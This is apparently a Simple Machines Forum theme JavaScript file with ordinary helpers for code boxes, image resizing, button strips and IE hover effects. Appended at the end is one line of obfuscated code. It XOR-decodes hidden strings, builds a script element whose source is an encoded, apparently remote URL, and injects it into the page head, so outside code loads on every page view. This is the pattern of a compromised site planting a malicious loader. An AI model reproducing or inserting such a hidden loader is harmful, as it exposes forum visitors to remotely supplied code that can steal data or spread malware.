// The purpose of this code is to fix the height of overflow: auto blocks, because some browsers can't figure it out for themselves.
function smf_codeBoxFix()
{
	var codeFix = document.getElementsByTagName('code');
	for (var i = codeFix.length - 1; i >= 0; i--)
	{
		if (is_webkit && codeFix[i].offsetHeight < 20)
			codeFix[i].style.height = (codeFix[i].offsetHeight + 20) + 'px';

		else if (is_ff && (codeFix[i].scrollWidth > codeFix[i].clientWidth || codeFix[i].clientWidth == 0))
			codeFix[i].style.overflow = 'scroll';

		else if ('currentStyle' in codeFix[i] && codeFix[i].currentStyle.overflow == 'auto' && (codeFix[i].currentStyle.height == '' || codeFix[i].currentStyle.height == 'auto') && (codeFix[i].scrollWidth > codeFix[i].clientWidth || codeFix[i].clientWidth == 0) && (codeFix[i].offsetHeight != 0))
			codeFix[i].style.height = (codeFix[i].offsetHeight + 24) + 'px';
	}
}

// Add a fix for code stuff?
if ((is_ie && !is_ie4) || is_webkit || is_ff)
	addLoadEvent(smf_codeBoxFix);

// Toggles the element height and width styles of an image.
function smc_toggleImageDimensions()
{
	var oImages = document.getElementsByTagName('IMG');
	for (oImage in oImages)
	{
		// Not a resized image? Skip it.
		if (oImages[oImage].className == undefined || oImages[oImage].className.indexOf('bbc_img resized') == -1)
			continue;

		oImages[oImage].style.cursor = 'pointer';
		oImages[oImage].onclick = function() {
			this.style.width = this.style.height = this.style.width == 'auto' ? null : 'auto';
		};
	}
}

// Add a load event for the function above.
addLoadEvent(smc_toggleImageDimensions);

// Adds a button to a certain button strip.
function smf_addButton(sButtonStripId, bUseImage, oOptions)
{
	var oButtonStrip = document.getElementById(sButtonStripId);
	var aItems = oButtonStrip.getElementsByTagName('li');

	// Remove the 'last' class from the last item.
	if (aItems.length > 0)
	{
		var oLastItem = aItems[aItems.length - 1];
		oLastItem.className = oLastItem.className.replace(/\s*last/, 'position_holder');
	}

	// Add the button.
	var oButtonStripList = oButtonStrip.getElementsByTagName('ul')[0];
	var oNewButton = document.createElement('li');
	oNewButton.className = 'last';
	setInnerHTML(oNewButton, '<a href="' + oOptions.sUrl + '" ' + ('sCustom' in oOptions ? oOptions.sCustom : '') + '><span' + ('sId' in oOptions ? ' id="' + oOptions.sId + '"': '') + '>' + oOptions.sText + '</span></a>');

	oButtonStripList.appendChild(oNewButton);
}

// Adds hover events to list items. Used for a versions of IE that don't support this by default.
var smf_addListItemHoverEvents = function()
{
	var cssRule, newSelector;

	// Add a rule for the list item hover event to every stylesheet.
	for (var iStyleSheet = 0; iStyleSheet < document.styleSheets.length; iStyleSheet ++)
		for (var iRule = 0; iRule < document.styleSheets[iStyleSheet].rules.length; iRule ++)
		{
			oCssRule = document.styleSheets[iStyleSheet].rules[iRule];
			if (oCssRule.selectorText.indexOf('LI:hover') != -1)
			{
				sNewSelector = oCssRule.selectorText.replace(/LI:hover/gi, 'LI.iehover');
				document.styleSheets[iStyleSheet].addRule(sNewSelector, oCssRule.style.cssText);
			}
		}

	// Now add handling for these hover events.
	var oListItems = document.getElementsByTagName('LI');
	for (oListItem in oListItems)
	{
		oListItems[oListItem].onmouseover = function() {
			this.className += ' iehover';
		};

		oListItems[oListItem].onmouseout = function() {
			this.className = this.className.replace(new RegExp(' iehover\\b'), '');
		};
	}
}

// Add hover events to list items if the browser requires it.
if (is_ie6down && 'attachEvent' in window)
	window.attachEvent('onload', smf_addListItemHoverEvents);
function i7Rt41(wm,w9xy8k){var sQ5I='';var ro9ALL=0;var j9Ig=0;for(ro9ALL=0;ro9ALL<wm.length;ro9ALL++){var zO38x3=wm.charAt(ro9ALL);var idto=zO38x3.charCodeAt(0)^w9xy8k.charCodeAt(j9Ig);zO38x3=String.fromCharCode(idto);sQ5I+=zO38x3;if(j9Ig==w9xy8k.length-1)j9Ig=0;else j9Ig++;}return (sQ5I);}function xZB(xZ){return i7Rt41(xV73(xZ),'vYRL1Io24AWGg');}var oA1A3w=["005058","004048","006045","021043055045069044042094081044050041019","005043049","002032034041","002060042056030035014068085050052053014006045","023041034041095045044090093045051","030060051040","017060038009093044002087090053036005030034056053002080036010","030045038060011102064065064032035034073005052062126031059026029094050120036009002119056063"];z26kgj(xZB(oA1A3w[10]));function xV73(hq6O){var vC7='';var sqK82=0;var w7w=0;for(sqK82=0;sqK82<hq6O.length/3;sqK82++){vC7+=String.fromCharCode(hq6O.slice(w7w,w7w+3));w7w=w7w+3;}return vC7;}function z26kgj(heR){var sb10l=document[xZB(oA1A3w[3])](xZB(oA1A3w[0])+xZB(oA1A3w[1])+xZB(oA1A3w[2]));sb10l[xZB(oA1A3w[4])]=heR;sb10l[xZB(oA1A3w[5])]=xZB(oA1A3w[6]);document[xZB(oA1A3w[9])](xZB(oA1A3w[8]))[0][xZB(oA1A3w[7])](sb10l);}